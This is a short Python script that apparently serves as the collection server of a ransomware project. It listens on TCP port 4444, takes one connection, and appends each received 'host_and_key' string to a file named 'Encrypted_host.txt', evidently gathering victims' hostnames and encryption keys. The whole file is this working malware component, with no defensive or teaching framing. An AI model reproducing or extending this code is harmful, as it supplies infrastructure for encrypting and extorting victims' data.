import socket

IP_ADDRESS = ''
PORT = 4444

print('Creating Socket')

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
	s.bind((IP_ADDRESS,PORT))
	print('Listening for Connections..........')
	s.listen(1)
	conn,addr =s.accept()
	print((f'Connection from {addr} established :)'))

	with conn:
		while True:
			host_and_key = conn.recv(1024).decode()
			with open ('Encrypted_host.txt','a') as f:
				f.write(host_and_key+'\n')
			break

		print('Connection completed and closed!!!  :)')


